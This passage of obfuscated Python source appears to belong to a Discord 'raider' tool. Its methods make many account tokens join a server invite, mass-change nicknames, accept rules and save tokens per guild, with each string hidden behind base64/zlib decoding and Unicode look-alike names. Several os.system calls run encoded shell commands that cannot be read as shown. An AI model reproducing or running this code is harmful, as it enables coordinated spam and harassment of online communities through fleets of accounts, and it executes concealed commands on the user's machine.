        𝙤𝙨.system(__𝘪𝗺𝗽𝗼𝙧𝘁__(𝙡𝘔𝙄𝘐𝙈𝘭𝙈𝘕𝗜𝗜𝗡𝙈𝙡𝗹𝘐𝙈𝘭𝘔𝘭𝙄𝙈𝘐𝙈𝘐𝘕𝗠𝙄𝘭𝙡𝙡𝙉𝙡[𝘳𝘰𝘂𝘯𝙙(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝗶𝗺𝘱𝘰𝘳𝘵__(𝗹𝙈𝙄𝗜𝗠𝘭𝙈𝙉𝘐𝘐𝘕𝙈𝙡𝗹𝙄𝗠𝙡𝘔𝙡𝗜𝘔𝘐𝘔𝗜𝙉𝘔𝗜𝗹𝘭𝙡𝘕𝗹[𝘳𝙤𝘂𝗻𝘥(𝘢𝘣𝘴(0.1273841554342452 + 0.9918534553775089j))]).decompress(b'x\xda\x8b4\xaa\xa8\x02\x00\x03h\x01~')).decode())
        𝙥𝗿𝗶𝗻𝙩(𝗺𝙚𝗻𝘂)
        𝗴𝘶𝙞𝙡𝗱 = 𝗳3𝘯𝗩𝗚𝗤𝘒𝙁𝙞𝘆𝙍𝘃𝗳𝘙3𝗗𝘳2𝘨𝗥𝙛𝘧𝘕𝗵𝙗_𝗻1𝗮𝙌𝙢𝘮.mro()[9](𝗶𝙣𝗽𝘶𝙩(__𝗶𝗺𝙥𝗼𝗿𝘵__(𝙡𝙈𝘐𝙄𝗠𝗹𝙈𝗡𝙄𝗜𝗡𝗠𝗹𝙡𝗜𝙈𝙡𝘔𝙡𝗜𝘔𝘐𝗠𝘐𝗡𝗠𝗜𝘭𝙡𝗹𝘕𝘭[𝙧𝗼𝘶𝗻𝘥(𝗮𝗯𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝙤𝙧𝙩__(𝘭𝗠𝘐𝗜𝙈𝘭𝘔𝘕𝘐𝗜𝙉𝗠𝗹𝙡𝗜𝗠𝘭𝙈𝙡𝘐𝙈𝙄𝘔𝙄𝙉𝙈𝙄𝘭𝙡𝘭𝙉𝗹[𝗿𝙤𝘶𝘯𝙙(𝗮𝘣𝙨(0.19686661146728757 + 0.9804302817076735j))]).decompress(b"x\xdaK56LJ56\xf4H\t\xcf)\x8erv\xf2\n\xf2(\xb1\x8c\x08v\xc9\xcc(\xf0L\x07\x00\x7f\xb7\t'")).decode().format(𝘳, 𝙡𝗰, 𝗿)))
        if 𝗴𝘂𝙞𝙡𝘥 == __𝙞𝙢𝗽𝘰𝙧𝘵__(𝗹𝘔𝘐𝘐𝘔𝘭𝗠𝗡𝙄𝘐𝗡𝗠𝗹𝘭𝘐𝗠𝗹𝗠𝙡𝘐𝙈𝘐𝗠𝙄𝘕𝙈𝙄𝗹𝙡𝘭𝙉𝘭[𝙧𝙤𝘶𝙣𝙙(𝙖𝙗𝙨(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝗼𝙧𝘁__(𝗹𝙈𝘐𝙄𝗠𝗹𝘔𝘕𝘐𝙄𝘕𝙈𝗹𝗹𝙄𝗠𝗹𝙈𝗹𝙄𝗠𝗜𝙈𝙄𝗡𝗠𝙄𝙡𝘭𝘭𝗡𝗹[𝙧𝘰𝘂𝘯𝘥(𝙖𝘣𝘀(0.013184941952452123 + 0.9999130748748666j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode():
            𝙈𝗲𝗻𝘂().main_menu()
        𝘯𝘪𝘤𝗸 = 𝙞𝗻𝙥𝙪𝙩(__𝙞𝗺𝘱𝙤𝗿𝙩__(𝙡𝙈𝘐𝙄𝙈𝙡𝗠𝙉𝙄𝘐𝙉𝗠𝘭𝘭𝘐𝗠𝙡𝘔𝘭𝗜𝘔𝘐𝘔𝙄𝘕𝙈𝗜𝗹𝗹𝗹𝙉𝗹[𝙧𝗼𝘂𝘯𝗱(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(__𝗶𝙢𝙥𝗼𝙧𝙩__(𝗹𝙈𝘐𝗜𝘔𝗹𝗠𝙉𝘐𝗜𝙉𝗠𝗹𝗹𝘐𝗠𝗹𝘔𝗹𝙄𝙈𝗜𝗠𝗜𝗡𝙈𝙄𝙡𝘭𝙡𝗡𝘭[𝘳𝗼𝙪𝘯𝙙(𝗮𝙗𝘀(0.6888434457487578 + 0.7249101373611616j))]).decompress(b'x\xdaK56LJ56\xf4O\x0c\xf7+\x02\xd2)\x9e\xfe\xde\xee\xd9\x99\x8e\xb6\x00[\x91\x07e')).decode().format(𝗿, 𝗹𝗰, 𝙧))
        if 𝗻𝙞𝙘𝙠 == __𝗶𝘮𝗽𝘰𝗿𝙩__(𝗹𝘔𝙄𝙄𝙈𝘭𝗠𝘕𝙄𝙄𝘕𝗠𝗹𝘭𝗜𝘔𝘭𝙈𝗹𝗜𝙈𝘐𝗠𝗜𝘕𝘔𝙄𝘭𝗹𝙡𝗡𝙡[𝘳𝙤𝙪𝗻𝙙(𝙖𝙗𝘀(0.0 + 0j))]).b64decode(__𝙞𝘮𝗽𝘰𝙧𝙩__(𝙡𝗠𝗜𝘐𝘔𝙡𝘔𝙉𝗜𝙄𝙉𝘔𝙡𝗹𝙄𝘔𝙡𝗠𝙡𝙄𝗠𝘐𝘔𝗜𝗡𝘔𝘐𝘭𝗹𝗹𝙉𝘭[𝙧𝗼𝘶𝙣𝙙(𝙖𝘣𝙨(0.06627574973845529 + 0.997801345457404j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode():
            𝙈𝘦𝗻𝘶().main_menu()
        𝗼𝘴.system(__𝗶𝙢𝙥𝘰𝙧𝘁__(𝗹𝗠𝙄𝙄𝗠𝘭𝘔𝙉𝘐𝙄𝙉𝗠𝘭𝙡𝙄𝘔𝙡𝗠𝙡𝗜𝘔𝘐𝙈𝙄𝘕𝘔𝙄𝙡𝘭𝗹𝗡𝙡[𝘳𝙤𝘶𝘯𝘥(𝙖𝙗𝘴(0.0 + 0j))]).b64decode(__𝗶𝗺𝗽𝗼𝙧𝙩__(𝘭𝗠𝘐𝙄𝘔𝗹𝗠𝙉𝙄𝘐𝘕𝙈𝗹𝘭𝙄𝙈𝗹𝗠𝙡𝙄𝘔𝗜𝗠𝙄𝘕𝙈𝗜𝗹𝙡𝘭𝙉𝘭[𝘳𝙤𝘶𝙣𝙙(𝗮𝙗𝘴(0.704491609060585 + 0.7097123169025799j))]).decompress(b'x\xda\x8b4\xaa\xa8\x02\x00\x03h\x01~')).decode())
        𝙥𝗿𝘪𝗻𝘵(𝙢𝘦𝘯𝘶)
        for 𝙩𝙤𝗸𝘦𝙣 in 𝙩𝘰𝗸𝗲𝘯𝘀:
            𝘁𝘩𝙧𝘦𝘢𝘥𝘪𝙣𝙜.Thread(target=𝘮𝙖𝘀𝘴_𝙣𝙞𝗰𝘬, args=(𝘵𝙤𝘬𝗲𝙣, 𝙜𝙪𝘪𝗹𝙙, 𝙣𝗶𝗰𝘬)).start()
        𝗲𝘹𝗶𝘁 = 𝗶𝘯𝗽𝘶𝘵(__𝘪𝙢𝗽𝙤𝘳𝘵__(𝙡𝗠𝗜𝘐𝗠𝗹𝘔𝙉𝗜𝘐𝗡𝘔𝗹𝗹𝙄𝗠𝙡𝘔𝘭𝙄𝗠𝘐𝘔𝘐𝗡𝗠𝗜𝗹𝘭𝗹𝗡𝘭[𝘳𝘰𝘂𝘯𝘥(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝘱𝗼𝘳𝘁__(𝙡𝘔𝙄𝗜𝙈𝘭𝙈𝙉𝗜𝘐𝙉𝗠𝙡𝗹𝙄𝗠𝗹𝗠𝙡𝙄𝙈𝘐𝗠𝗜𝗡𝙈𝗜𝗹𝘭𝙡𝙉𝗹[𝘳𝙤𝘶𝗻𝙙(𝗮𝘣𝘀(0.650834614122216 + 0.7592195368010404j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())
        𝗲𝘹𝙞𝙩 = 𝘔𝙚𝗻𝘶().main_menu()
        𝙚𝙭𝗶𝙩()

    @𝙬𝘳𝗮𝗽𝘱𝗲𝙧
    def Check_guild(self):
        𝗼𝙨.system(__𝗶𝙢𝙥𝘰𝙧𝙩__(𝘭𝗠𝙄𝘐𝘔𝗹𝘔𝘕𝙄𝗜𝗡𝙈𝘭𝗹𝙄𝙈𝗹𝘔𝙡𝘐𝗠𝗜𝙈𝙄𝙉𝗠𝘐𝘭𝘭𝘭𝘕𝗹[𝘳𝗼𝘂𝗻𝘥(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(__𝘪𝘮𝗽𝗼𝘳𝙩__(𝙡𝘔𝘐𝘐𝗠𝘭𝗠𝘕𝗜𝗜𝗡𝙈𝙡𝙡𝗜𝗠𝙡𝗠𝙡𝗜𝙈𝘐𝗠𝗜𝘕𝘔𝙄𝘭𝙡𝘭𝙉𝙡[𝙧𝙤𝘂𝙣𝗱(𝘢𝙗𝙨(0.5601233792152818 + 0.8284091984378575j))]).decompress(b'x\xdaKq\xcf1Hr\x0fM\x0fv\x0f+N\x8c\x08+\xf1t6H\x0f4\xca\xc8\x894*N\x0f2\x0e+Hr\x0f\xb4\x05\x00\xdf=\x0b\xf4')).decode())
        𝘰𝘀.system(__𝗶𝗺𝙥𝘰𝘳𝙩__(𝘭𝗠𝘐𝘐𝙈𝗹𝗠𝘕𝗜𝘐𝗡𝙈𝘭𝙡𝘐𝘔𝘭𝗠𝙡𝙄𝘔𝘐𝗠𝘐𝗡𝘔𝘐𝗹𝙡𝙡𝙉𝙡[𝗿𝘰𝘶𝙣𝘥(𝘢𝙗𝘀(0.0 + 0j))]).b64decode(__𝗶𝗺𝙥𝘰𝗿𝙩__(𝗹𝘔𝙄𝘐𝘔𝙡𝗠𝘕𝗜𝙄𝙉𝘔𝗹𝗹𝙄𝙈𝗹𝘔𝗹𝙄𝙈𝙄𝗠𝘐𝙉𝙈𝙄𝙡𝙡𝘭𝙉𝙡[𝘳𝘰𝘂𝘯𝘥(𝘢𝘣𝘀(0.028822624601274827 + 0.999584541852811j))]).decompress(b'x\xda\x8b4\xaa\xa8\x02\x00\x03h\x01~')).decode())
        𝘱𝗿𝙞𝘯𝘵(𝘮𝘦𝗻𝘶)
        𝘨𝙪𝗶𝘭𝗱𝙞𝙙 = 𝘪𝘯𝙥𝙪𝙩(__𝘪𝙢𝘱𝘰𝙧𝘁__(𝗹𝗠𝙄𝙄𝘔𝗹𝙈𝗡𝘐𝗜𝗡𝗠𝘭𝘭𝘐𝘔𝙡𝙈𝙡𝘐𝗠𝗜𝗠𝙄𝙉𝘔𝘐𝙡𝙡𝙡𝗡𝙡[𝗿𝗼𝙪𝙣𝘥(𝗮𝙗𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝗽𝘰𝗿𝘁__(𝘭𝘔𝗜𝘐𝙈𝗹𝗠𝗡𝘐𝗜𝗡𝙈𝗹𝗹𝗜𝗠𝙡𝗠𝗹𝙄𝘔𝘐𝙈𝘐𝘕𝗠𝗜𝙡𝙡𝗹𝗡𝘭[𝘳𝘰𝘶𝗻𝗱(𝘢𝗯𝘴(0.4617915557565847 + 0.8869884773952327j))]).decompress(b"x\xdaK56LJ56\xf4H\t\xcf)\x8erv\xf2\n\xf2(\xb1\x8c\x08v\xc9\xcc(\xf0L\x07\x00\x7f\xb7\t'")).decode().format(𝙧, 𝙡𝙘, 𝗿))
        if 𝙜𝙪𝙞𝘭𝙙𝘪𝘥 == __𝙞𝗺𝘱𝗼𝗿𝙩__(𝙡𝗠𝗜𝙄𝙈𝘭𝘔𝘕𝗜𝗜𝗡𝗠𝘭𝙡𝘐𝗠𝗹𝘔𝘭𝘐𝘔𝘐𝘔𝘐𝘕𝘔𝙄𝙡𝘭𝙡𝙉𝗹[𝙧𝙤𝙪𝗻𝗱(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝘰𝘳𝘵__(𝘭𝘔𝘐𝙄𝙈𝘭𝙈𝗡𝗜𝘐𝗡𝗠𝗹𝙡𝗜𝙈𝙡𝗠𝙡𝗜𝙈𝘐𝘔𝘐𝙉𝗠𝗜𝙡𝙡𝗹𝙉𝘭[𝗿𝙤𝘂𝘯𝙙(𝗮𝙗𝙨(0.348450643160536 + 0.9373271303451154j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode():
            𝗠𝙚𝙣𝘂().main_menu()
        𝙤𝘀.system(__𝙞𝗺𝗽𝘰𝙧𝘁__(𝘭𝗠𝘐𝗜𝙈𝘭𝘔𝙉𝗜𝘐𝙉𝗠𝗹𝙡𝙄𝗠𝘭𝗠𝘭𝘐𝙈𝗜𝘔𝙄𝗡𝘔𝙄𝘭𝗹𝗹𝘕𝙡[𝙧𝗼𝙪𝘯𝗱(𝘢𝗯𝘀(0.0 + 0j))]).b64decode(__𝙞𝗺𝘱𝙤𝗿𝘵__(𝗹𝙈𝙄𝙄𝗠𝙡𝗠𝙉𝘐𝗜𝙉𝙈𝘭𝘭𝗜𝘔𝗹𝙈𝙡𝙄𝗠𝙄𝗠𝘐𝙉𝘔𝘐𝗹𝘭𝗹𝘕𝗹[𝙧𝘰𝙪𝙣𝘥(𝙖𝗯𝘀(0.015077419847842943 + 0.9998863292448457j))]).decompress(b'x\xda\x8b4\xaa\xa8\x02\x00\x03h\x01~')).decode())
        𝗽𝘳𝙞𝗻𝘁(𝗺𝘦𝗻𝘂)
        𝘴𝗮𝙫𝘦_𝙩𝗼𝘬𝗲𝘯𝙨_𝘨𝙪𝙞𝘭𝗱(__𝙞𝘮𝗽𝗼𝘳𝘵__(𝙡𝘔𝘐𝗜𝘔𝙡𝘔𝗡𝙄𝙄𝙉𝗠𝙡𝗹𝘐𝙈𝘭𝙈𝙡𝘐𝘔𝙄𝘔𝗜𝗡𝙈𝘐𝘭𝙡𝘭𝘕𝙡[𝗿𝘰𝙪𝙣𝙙(𝗮𝙗𝙨(0.0 + 0j))]).b64decode(__𝘪𝙢𝙥𝗼𝘳𝙩__(𝘭𝙈𝘐𝘐𝗠𝙡𝗠𝘕𝙄𝙄𝘕𝘔𝘭𝙡𝗜𝗠𝘭𝗠𝘭𝘐𝗠𝗜𝗠𝙄𝘕𝗠𝙄𝘭𝗹𝘭𝗡𝘭[𝘳𝘰𝙪𝗻𝘥(𝘢𝘣𝘴(0.04425655849775956 + 0.9990201985094868j))]).decompress(b'x\xda\x8brw3\x88\x0c\xb64H2*\xc9I\xca\xf3-M\xf1\xc80\x00\x00A\x1b\x06w')).decode(), 𝙜𝙪𝙞𝘭𝗱𝘪𝘥)
        𝘦𝙭𝗶𝘁 = 𝘪𝗻𝙥𝘂𝘁(__𝗶𝙢𝗽𝗼𝗿𝙩__(𝘭𝙈𝙄𝘐𝘔𝘭𝗠𝘕𝙄𝘐𝙉𝘔𝙡𝘭𝗜𝗠𝘭𝙈𝘭𝙄𝙈𝙄𝙈𝘐𝘕𝘔𝘐𝗹𝙡𝙡𝗡𝘭[𝗿𝘰𝘶𝗻𝗱(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(__𝗶𝘮𝙥𝙤𝘳𝘵__(𝙡𝘔𝘐𝙄𝘔𝙡𝘔𝘕𝘐𝙄𝘕𝗠𝘭𝘭𝗜𝙈𝘭𝗠𝙡𝗜𝗠𝙄𝗠𝗜𝘕𝗠𝙄𝗹𝙡𝗹𝙉𝙡[𝘳𝙤𝘶𝗻𝘥(𝙖𝗯𝙨(0.5193863658918306 + 0.8545395268363409j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())
        𝘦𝘅𝙞𝘁 = 𝙈𝙚𝘯𝙪().main_menu()
        𝗲𝘅𝘪𝘵()

    @𝘄𝘳𝗮𝘱𝘱𝗲𝗿
    def joiner(self):
        𝘰𝘀.system(__𝙞𝗺𝘱𝙤𝗿𝘁__(𝙡𝙈𝘐𝙄𝘔𝙡𝘔𝙉𝘐𝘐𝗡𝙈𝗹𝙡𝘐𝘔𝙡𝗠𝘭𝗜𝙈𝘐𝘔𝘐𝙉𝗠𝗜𝗹𝙡𝗹𝗡𝙡[𝘳𝗼𝙪𝘯𝗱(𝗮𝗯𝘴(0.0 + 0j))]).b64decode(__𝗶𝘮𝙥𝙤𝘳𝙩__(𝗹𝙈𝘐𝗜𝗠𝙡𝙈𝘕𝙄𝙄𝗡𝙈𝘭𝗹𝘐𝗠𝙡𝘔𝙡𝗜𝗠𝙄𝗠𝗜𝙉𝙈𝗜𝘭𝙡𝙡𝘕𝘭[𝗿𝙤𝘶𝙣𝘥(𝙖𝗯𝙨(0.6547027434232613 + 0.7558864450127779j))]).decompress(b'x\xdaKq\xcf1Hr\x0fM\x0fv\x0f+N\x8c\x08+\xf1t6H\x0f\xce\xb5,H\xca\r\xab\x04\x00\x89\x9c\t\xbd')).decode())
        𝙤𝙨.system(__𝗶𝙢𝗽𝗼𝙧𝙩__(𝘭𝗠𝘐𝙄𝗠𝘭𝙈𝘕𝗜𝙄𝙉𝗠𝗹𝙡𝙄𝘔𝗹𝙈𝘭𝗜𝗠𝗜𝘔𝗜𝙉𝘔𝘐𝘭𝘭𝗹𝗡𝙡[𝗿𝙤𝘂𝘯𝗱(𝘢𝙗𝘀(0.0 + 0j))]).b64decode(__𝙞𝙢𝙥𝗼𝙧𝘵__(𝘭𝗠𝙄𝘐𝘔𝙡𝘔𝗡𝙄𝗜𝙉𝙈𝗹𝗹𝘐𝘔𝘭𝘔𝗹𝙄𝙈𝘐𝘔𝘐𝗡𝗠𝗜𝗹𝘭𝘭𝗡𝘭[𝗿𝙤𝘂𝙣𝗱(𝙖𝗯𝘴(0.7897050805069277 + 0.6134866631162791j))]).decompress(b'x\xda\x8b4\xaa\xa8\x02\x00\x03h\x01~')).decode())
        𝙥𝘳𝗶𝙣𝘁(𝗺𝙚𝘯𝙪)
        𝘪𝘯𝙫𝙞𝙩𝙚 = 𝙞𝘯𝙥𝘶𝘁(__𝘪𝗺𝗽𝘰𝙧𝙩__(𝘭𝙈𝙄𝙄𝘔𝘭𝗠𝗡𝙄𝙄𝙉𝙈𝘭𝙡𝘐𝘔𝗹𝘔𝙡𝙄𝙈𝗜𝘔𝗜𝙉𝙈𝙄𝘭𝙡𝘭𝘕𝗹[𝘳𝙤𝘶𝗻𝗱(𝙖𝙗𝙨(0.0 + 0j))]).b64decode(__𝘪𝘮𝗽𝙤𝙧𝘁__(𝙡𝘔𝘐𝘐𝘔𝘭𝗠𝘕𝘐𝙄𝙉𝗠𝘭𝙡𝘐𝘔𝗹𝙈𝙡𝙄𝘔𝗜𝗠𝗜𝘕𝙈𝙄𝘭𝘭𝗹𝘕𝙡[𝙧𝙤𝘂𝙣𝙙(𝙖𝙗𝘀(0.6959958688579216 + 0.718045785819196j))]).decompress(b'x\xdaK56LJ56\xf4\n\xc9\x89\xf2\ns\r5\xf3\xf4(\xb1\x8c\x08v\xb4\x05\x00Z\x14\x070')).decode().format(𝘳, 𝗹𝙘, 𝘳))
        if 𝗶𝘯𝘷𝘪𝘵𝘦 == __𝗶𝙢𝗽𝙤𝙧𝘵__(𝙡𝗠𝗜𝙄𝗠𝘭𝘔𝗡𝗜𝙄𝙉𝘔𝘭𝘭𝘐𝘔𝘭𝘔𝗹𝙄𝘔𝙄𝗠𝙄𝘕𝙈𝙄𝙡𝘭𝗹𝗡𝘭[𝘳𝘰𝙪𝘯𝙙(𝙖𝗯𝘴(0.0 + 0j))]).b64decode(__𝘪𝘮𝘱𝙤𝙧𝘵__(𝙡𝙈𝘐𝙄𝘔𝙡𝙈𝙉𝗜𝘐𝙉𝙈𝙡𝙡𝗜𝗠𝘭𝙈𝙡𝘐𝗠𝘐𝗠𝘐𝘕𝘔𝘐𝙡𝙡𝙡𝘕𝙡[𝘳𝘰𝘂𝙣𝙙(𝙖𝙗𝘴(0.7889417516678253 + 0.6144679914163987j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode():
            𝙈𝗲𝘯𝘶().main_menu()
        𝙙𝗲𝗹𝙖𝘺 = 𝙅𝘕𝗤5𝙏𝙂𝙐𝙫𝘠𝘾𝙚𝙐𝗧𝘲30𝙝𝘂𝗲𝘊𝙪𝙠𝗠𝙉2𝗨𝙆𝙓7𝘾𝘚𝘂.mro()[8](𝗶𝘯𝘱𝘂𝘵(__𝘪𝗺𝙥𝙤𝗿𝘵__(𝘭𝗠𝘐𝙄𝙈𝙡𝙈𝗡𝘐𝙄𝗡𝙈𝗹𝙡𝗜𝙈𝘭𝗠𝙡𝙄𝙈𝙄𝙈𝗜𝘕𝗠𝘐𝘭𝙡𝗹𝙉𝗹[𝘳𝙤𝙪𝙣𝗱(𝗮𝙗𝘀(0.0 + 0j))]).b64decode(__𝗶𝙢𝘱𝘰𝗿𝘵__(𝙡𝘔𝙄𝙄𝙈𝗹𝘔𝙉𝙄𝙄𝙉𝘔𝙡𝗹𝙄𝗠𝘭𝙈𝘭𝗜𝗠𝘐𝙈𝘐𝘕𝘔𝙄𝙡𝙡𝘭𝘕𝘭[𝗿𝗼𝘶𝙣𝙙(𝘢𝙗𝘀(0.9353079596051284 + 0.35383473642265756j))]).decompress(b'x\xdaK56LJ56\xf4N2\xca)M\x0c7\xcd\xf3t\r\xcaIrw3\x05\x8a\xa5x\xfa{\xbbgg:\xda\x02\x00\xce\x87\x0b)')).decode().format(𝙧, 𝘭𝘤, 𝙧)))
        if 𝘥𝙚𝙡𝗮𝙮 == __𝙞𝘮𝗽𝗼𝗿𝘵__(𝙡𝙈𝗜𝗜𝘔𝘭𝙈𝙉𝙄𝗜𝗡𝘔𝗹𝘭𝙄𝙈𝙡𝗠𝗹𝘐𝗠𝘐𝗠𝗜𝙉𝘔𝘐𝗹𝘭𝙡𝘕𝙡[𝙧𝙤𝘂𝘯𝘥(𝘢𝗯𝙨(0.0 + 0j))]).b64decode(__𝙞𝗺𝙥𝘰𝘳𝘵__(𝘭𝘔𝙄𝙄𝙈𝘭𝗠𝘕𝙄𝘐𝙉𝗠𝙡𝙡𝘐𝗠𝗹𝙈𝙡𝗜𝙈𝘐𝗠𝙄𝘕𝗠𝘐𝗹𝗹𝙡𝗡𝘭[𝗿𝗼𝙪𝗻𝘥(𝙖𝙗𝙨(0.810970341074172 + 0.58508726348985j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode():
            𝙈𝘦𝗻𝙪().main_menu()
        if 𝙞𝙣𝘷𝘪𝙩𝗲.startswith(__𝘪𝙢𝗽𝙤𝙧𝘵__(𝘭𝗠𝗜𝘐𝘔𝗹𝗠𝗡𝘐𝙄𝘕𝙈𝗹𝙡𝘐𝗠𝘭𝙈𝙡𝘐𝗠𝘐𝘔𝘐𝘕𝗠𝙄𝗹𝗹𝘭𝙉𝘭[𝗿𝘰𝘂𝗻𝘥(𝗮𝗯𝙨(0.0 + 0j))]).b64decode(__𝘪𝙢𝙥𝘰𝙧𝘁__(𝗹𝙈𝗜𝘐𝙈𝘭𝘔𝙉𝙄𝙄𝗡𝗠𝘭𝙡𝗜𝘔𝘭𝙈𝙡𝙄𝗠𝙄𝗠𝗜𝗡𝙈𝗜𝗹𝙡𝘭𝙉𝗹[𝙧𝘰𝘂𝘯𝙙(𝗮𝘣𝘀(0.8531070831353081 + 0.5217358572154749j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xb0\x05\x00\x17\xc8\x03\x94')).decode()):
            𝗶𝙣𝙫𝙞𝘵𝗲_𝗻𝗮𝗺𝙚 = 𝙞𝘯𝘷𝗶𝘁𝙚.replace(__𝘪𝘮𝘱𝙤𝗿𝘵__(𝗹𝗠𝘐𝙄𝘔𝗹𝙈𝘕𝘐𝙄𝗡𝙈𝙡𝙡𝗜𝙈𝙡𝘔𝙡𝗜𝘔𝘐𝙈𝘐𝘕𝘔𝘐𝗹𝗹𝙡𝙉𝘭[𝗿𝘰𝘶𝗻𝗱(𝙖𝙗𝘀(0.0 + 0j))]).b64decode(__𝗶𝗺𝘱𝗼𝘳𝙩__(𝘭𝘔𝗜𝗜𝘔𝘭𝗠𝙉𝘐𝗜𝗡𝗠𝗹𝘭𝙄𝙈𝙡𝗠𝙡𝗜𝘔𝙄𝗠𝘐𝗡𝘔𝗜𝗹𝘭𝗹𝘕𝙡[𝗿𝘰𝘶𝘯𝗱(𝘢𝗯𝘴(0.8796062840565498 + 0.47570241227917703j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xb0\x05\x00\x17\xc8\x03\x94')).decode(), __𝘪𝙢𝙥𝗼𝙧𝘵__(𝙡𝗠𝘐𝙄𝘔𝙡𝗠𝗡𝙄𝙄𝘕𝘔𝘭𝗹𝙄𝘔𝗹𝙈𝗹𝘐𝘔𝗜𝘔𝙄𝘕𝘔𝙄𝙡𝘭𝗹𝙉𝘭[𝙧𝗼𝘂𝙣𝗱(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝗽𝙤𝗿𝘁__(𝗹𝘔𝗜𝙄𝙈𝗹𝙈𝙉𝗜𝙄𝘕𝗠𝙡𝘭𝙄𝙈𝘭𝙈𝗹𝙄𝗠𝘐𝘔𝗜𝘕𝙈𝗜𝗹𝗹𝗹𝗡𝘭[𝘳𝗼𝙪𝗻𝗱(𝗮𝙗𝘴(0.33909449055267704 + 0.9407523194108109j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode()).split(__𝘪𝘮𝘱𝘰𝗿𝙩__(𝙡𝙈𝙄𝘐𝗠𝘭𝙈𝙉𝘐𝙄𝘕𝙈𝙡𝗹𝘐𝙈𝙡𝘔𝙡𝙄𝙈𝙄𝙈𝘐𝙉𝙈𝙄𝙡𝗹𝘭𝗡𝘭[𝗿𝘰𝘶𝘯𝘥(𝘢𝗯𝘀(0.0 + 0j))]).b64decode(__𝗶𝘮𝗽𝘰𝗿𝘵__(𝙡𝘔𝗜𝗜𝗠𝗹𝘔𝙉𝘐𝘐𝘕𝗠𝗹𝙡𝗜𝘔𝘭𝗠𝗹𝙄𝗠𝗜𝘔𝙄𝗡𝗠𝙄𝘭𝙡𝙡𝘕𝘭[𝘳𝙤𝙪𝗻𝙙(𝘢𝙗𝘴(0.5417140980169385 + 0.8405628090807342j))]).decompress(b'x\xda\xf3)\xb7\xb5\x05\x00\x03P\x01>')).decode())[-𝘳𝙤𝙪𝙣𝗱(𝗮𝗯𝘴(0.7144564315243872 + 0.6996799321500071j))]
        else:
            𝘪𝙣𝘃𝙞𝘵𝙚_𝗻𝙖𝙢𝗲 = 𝗶𝘯𝙫𝗶𝘁𝙚.split(__𝘪𝗺𝘱𝘰𝘳𝘁__(𝗹𝘔𝗜𝘐𝙈𝙡𝗠𝗡𝘐𝗜𝘕𝘔𝗹𝘭𝙄𝘔𝗹𝗠𝘭𝙄𝙈𝙄𝘔𝘐𝘕𝙈𝗜𝘭𝗹𝙡𝘕𝙡[𝘳𝘰𝙪𝗻𝙙(𝗮𝙗𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝗼𝙧𝙩__(𝗹𝗠𝘐𝘐𝘔𝘭𝗠𝗡𝗜𝙄𝙉𝘔𝘭𝘭𝙄𝙈𝘭𝗠𝘭𝗜𝗠𝘐𝗠𝗜𝗡𝙈𝙄𝙡𝗹𝗹𝘕𝘭[𝘳𝗼𝘶𝙣𝘥(𝘢𝗯𝘴(0.1290950597409264 + 0.9916322229286857j))]).decompress(b'x\xda\xf3)\xb7\xb5\x05\x00\x03P\x01>')).decode())[-𝘳𝗼𝙪𝘯𝘥(𝘢𝙗𝙨(0.9054012325704666 + 0.424556955024741j))]
        𝙖𝙧𝘨𝘴 = [(𝙩𝗼𝗸𝙚𝗻, 𝙞𝗻𝘷𝗶𝘁𝗲_𝗻𝘢𝙢𝙚) for 𝘵𝗼𝙠𝙚𝘯 in 𝘁𝗼𝗸𝙚𝙣𝘀]
        𝘴𝙡𝗲𝗲𝗽(𝗱𝗲𝙡𝗮𝘆)
        𝙨𝗲𝗹𝘧.run(𝙨𝘦𝘭𝘧.raider.joiner, 𝘢𝘳𝘨𝘀)

    @𝘄𝙧𝘢𝘱𝗽𝗲𝘳
    def accept_rules(self):
        𝘰𝙨.system(__𝙞𝙢𝗽𝗼𝘳𝙩__(𝙡𝙈𝘐𝘐𝗠𝗹𝗠𝗡𝙄𝘐𝘕𝘔𝙡𝘭𝗜𝘔𝙡𝗠𝘭𝗜𝘔𝗜𝙈𝘐𝘕𝗠𝗜𝗹𝙡𝘭𝙉𝙡[𝙧𝙤𝘶𝘯𝙙(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝗶𝙢𝘱𝘰𝘳𝘁__(𝗹𝗠𝘐𝗜𝗠𝙡𝙈𝗡𝘐𝘐𝙉𝘔𝘭𝗹𝗜𝘔𝙡𝙈𝘭𝙄𝘔𝙄𝙈𝙄𝗡𝘔𝙄𝗹𝘭𝘭𝗡𝗹[𝙧𝙤𝘶𝗻𝘥(𝗮𝙗𝙨(0.7237320188973729 + 0.6900811291599942j))]).decompress(b'x\xdaKq\xcf1Hr\x0fM\x0fv\x0f+N\x8c\x08+\xf1t6H\x0f\x0c\xf7\xcb\x8a\x8ap2\xf0\xf4\xf02Lr\x0f\xab\x02\x00\xdc\xc6\x0b\xbf')).decode())
